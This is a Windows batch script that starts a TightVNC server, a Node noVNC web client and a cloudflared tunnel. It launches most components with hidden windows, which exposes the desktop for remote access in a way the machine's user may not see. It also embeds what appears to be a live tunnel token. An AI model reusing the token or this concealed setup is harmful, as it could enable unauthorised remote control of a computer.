@echo off
set "NO_VNC_DIR=C:\ProgramData\server\noVnc"

:: Start TightVNC server hidden
start "" "C:\Program Files\TightVNC\tvnserver.exe"

:: Wait a few seconds for TightVNC to initialize
timeout /t 5 /nobreak >nul

:: Run node hidden
powershell -WindowStyle Hidden -Command "Start-Process node -ArgumentList 'config.js' -WorkingDirectory '%NO_VNC_DIR%' -WindowStyle Hidden"

:: Wait 5 seconds
timeout /t 5 /nobreak >nul

:: Run cloudflared tunnel hidden
powershell -WindowStyle Hidden -Command "Start-Process cloudflared -ArgumentList 'tunnel run --token eyJhIjoiMzJkOThkNTA1ZmI1OTE4ODhiNjAzYWU1Y2EyYzFiNjUiLCJzIjoiTVdKa01qVmlOREl0TW1KbE1pMDBPVFF5TFdGaFltVXRNVFZtT0Rka01XVXdNalF6IiwidCI6IjJkMjRjMThmLTg5NTQtNGM4Yy05YTVkLWNjMzIxYTNkZjRmZCJ9' -WindowStyle Hidden"
